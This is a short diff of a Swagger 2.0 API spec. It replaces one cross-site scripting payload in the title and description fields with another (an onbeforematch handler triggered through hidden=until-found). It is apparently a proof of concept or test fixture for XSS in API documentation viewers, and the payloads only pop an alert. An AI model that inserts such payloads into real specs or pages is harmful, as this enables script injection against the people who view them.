@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: "<img src=x onerror=alert(document.domain)>"
-  description: "<img src=x onerror=alert(document.domain)>"
+  title: "<html id=xss><html onbeforematch=alert()><html hidden=until-found>"
+  description: "<html id=xss><html onbeforematch=alert()><html hidden=until-found>"
 
 paths:
   /Login_Page:
